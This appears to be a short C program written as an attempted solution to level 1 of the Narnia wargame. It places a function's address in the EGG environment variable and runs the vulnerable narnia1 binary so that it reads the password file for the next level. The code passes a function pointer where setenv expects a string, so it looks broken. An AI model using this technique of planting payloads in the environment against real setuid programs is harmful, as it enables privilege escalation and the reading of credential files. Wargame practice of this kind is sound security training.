#include <stdio.h>
#include <stdlib.h>

int fun()
{
    system("cat /etc/narnia_pass/narnia2");
    return 0;
}

int main()
{
    setenv("EGG", &fun, 1);
    system("/narnia/narnia1");

    return 0;
}